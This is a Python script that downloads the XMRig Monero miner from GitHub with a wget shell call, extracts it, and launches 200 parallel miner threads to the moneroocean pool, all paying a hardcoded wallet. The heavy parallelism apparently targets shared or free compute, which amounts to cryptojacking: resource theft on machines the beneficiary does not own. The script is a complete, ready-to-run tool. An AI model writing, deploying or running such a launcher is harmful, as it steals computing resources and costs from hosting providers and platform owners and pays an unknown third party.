import os
import subprocess
import threading

# ✅ Config
XMRIG_URL = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz"
XMRIG_ARCHIVE = "xmrig-6.18.0-linux-x64.tar.gz"
XMRIG_FOLDER = "xmrig-6.18.0"
POOL = "gulf.moneroocean.stream:10128"
WALLET = "47HxtCmFXxqVzQSGjQgBnDC1LRTrokf3aMFocbWQRxYzjhjxkfLGjzwE3PJhrCtdQkXPunr8cZZBAiEmY5W46V1UV8mFMZh"
PASS = "py"
ALGO = "randomx"
NUM_MINERS = 200

# ⬇️ Download and extract xmrig if needed
def setup_xmrig():
    if not os.path.exists(XMRIG_FOLDER):
        print("[⬇️] Downloading XMRig binary...")
        subprocess.run(f"wget {XMRIG_URL}", shell=True)
        print("[📦] Extracting XMRig...")
        subprocess.run(f"tar -xvf {XMRIG_ARCHIVE}", shell=True)
    else:
        print("[✅] XMRig already set up!")

# 🚀 Start miner thread
def start_miner(miner_id):
    print(f"[🚀] Starting miner #{miner_id}")
    cmd = [
        f"./{XMRIG_FOLDER}/xmrig",
        "-o", POOL,
        "-a", ALGO,
        "-u", WALLET,
        "-p", PASS
    ]
    subprocess.run(cmd)

# 🔁 Run miners in parallel
def run_miners():
    setup_xmrig()
    threads = []
    for i in range(1, NUM_MINERS + 1):
        t = threading.Thread(target=start_miner, args=(i,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

if __name__ == "__main__":
    run_miners()
